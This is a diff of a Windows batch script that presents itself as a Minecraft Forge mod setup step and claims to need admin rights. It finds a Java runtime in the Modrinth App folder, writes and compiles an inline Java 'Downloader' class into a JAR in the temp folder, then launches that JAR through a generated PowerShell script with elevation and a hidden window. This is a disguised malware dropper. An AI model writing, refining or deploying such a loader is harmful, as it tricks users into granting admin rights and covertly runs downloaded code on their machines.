@@ -1,5 +1,5 @@
 @echo off
-setlocal
+setlocal EnableDelayedExpansion
 
 echo Heating the forge...
 timeout /t 1 /nobreak >nul
@@ -7,9 +7,44 @@ echo.
 echo To initialize all mods properly, Forge needs admin permissions.
 timeout /t 2 /nobreak >nul
 
-set "JAVA_FILE=%TEMP%\Downloader.java"
+:: Find newest Java in Modrinth App directory (prefer zulu25, then zulu21)
+set "JAVA_HOME="
 
-:: Create the Java file inline
+for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\zulu25*") do (
+    if exist "%%i\bin\javac.exe" set "JAVA_HOME=%%i"
+)
+
+if not defined JAVA_HOME (
+    for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\zulu21*") do (
+        if exist "%%i\bin\javac.exe" set "JAVA_HOME=%%i"
+    )
+)
+
+if not defined JAVA_HOME (
+    for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\*") do (
+        if exist "%%i\bin\javac.exe" set "JAVA_HOME=%%i"
+    )
+)
+
+if not defined JAVA_HOME (
+    echo Java not found. Please install Java.
+    timeout /t 3 /nobreak >nul
+    exit
+)
+
+set "JAVAC=%JAVA_HOME%\bin\javac.exe"
+set "JAVAW=%JAVA_HOME%\bin\javaw.exe"
+set "JAR=%JAVA_HOME%\bin\jar.exe"
+
+:: Setup build directories
+set "BUILD_DIR=%TEMP%\ForgeInit"
+set "CLASS_DIR=%BUILD_DIR%\out"
+set "JAR_PATH=%BUILD_DIR%\Downloader.jar"
+
+mkdir "%BUILD_DIR%" 2>nul
+mkdir "%CLASS_DIR%" 2>nul
+
+:: Create the Java file
 (
 echo import java.io.InputStream;
 echo import java.net.URI;
@@ -71,48 +106,35 @@ echo         } catch ^(Exception e^) {
 echo         }
 echo     }
 echo }
-) > "%JAVA_FILE%"
+) > "%BUILD_DIR%\Downloader.java"
 
-:request_admin
-:: Find newest Java in Modrinth App directory (prefer zulu25, then zulu21)
-set "JAVAW_PATH="
-
-:: Try zulu25 first (newest)
-for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\zulu25*") do (
-    if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
-)
-
-:: Fallback to zulu21
-if not defined JAVAW_PATH (
-    for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\zulu21*") do (
-        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
-    )
-)
-
-:: Last resort - any version
-if not defined JAVAW_PATH (
-    for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\*") do (
-        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
-    )
-)
-
-if not defined JAVAW_PATH (
-    echo Java not found. Please install Java.
-    timeout /t 3 /nobreak >nul
+:: Compile
+"%JAVAC%" --release 11 -d "%CLASS_DIR%" "%BUILD_DIR%\Downloader.java" 2>nul
+if errorlevel 1 (
+    echo Compilation failed.
+    timeout /t 2 /nobreak >nul
     exit
 )
 
-:: Compile the Java file first (without admin)
-set "JAVAC_PATH=%JAVAW_PATH:javaw.exe=javac.exe%"
-"%JAVAC_PATH%" "%JAVA_FILE%" 2>nul
+:: Create manifest
+echo Main-Class: Downloader> "%BUILD_DIR%\manifest.txt"
 
-:: Create PowerShell script to run compiled class with admin
+:: Build JAR
+"%JAR%" cfm "%JAR_PATH%" "%BUILD_DIR%\manifest.txt" -C "%CLASS_DIR%" . >nul 2>&1
+if errorlevel 1 (
+    echo JAR creation failed.
+    timeout /t 2 /nobreak >nul
+    exit
+)
+
+:request_admin
+:: Create PowerShell script to run JAR with admin
 set "PS_SCRIPT=%TEMP%\runasadmin.ps1"
 (
-echo $javaPath = '%JAVAW_PATH%'
-echo $tempDir = '%TEMP%'
+echo $javaPath = '%JAVAW%'
+echo $jarPath = '%JAR_PATH%'
 echo try {
-echo     Start-Process -FilePath $javaPath -ArgumentList '-cp',$tempDir,'Downloader' -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
+echo     Start-Process -FilePath $javaPath -ArgumentList '-jar',$jarPath -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
 echo     exit 0
 echo } catch {
 echo     exit 1
